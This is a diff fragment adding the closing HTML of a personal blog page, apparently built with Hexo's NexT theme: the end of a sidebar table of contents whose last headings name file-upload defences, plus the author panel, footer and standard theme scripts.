class="nav-text">白名单+随机重命名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E9%87%87%E6%A0%B7-%E5%A4%B4%E9%83%A8%E5%85%83%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B"><span class="nav-number">3.21.2.</span> <span class="nav-text">重采样+头部元数据检测</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="slient2009"
+      src="/images/round_tiger.png">
+  <p class="site-author-name" itemprop="name">slient2009</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">ポスト</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">タグ</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">slient2009</span>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="合計閲覧者数">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="閲覧合計数">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
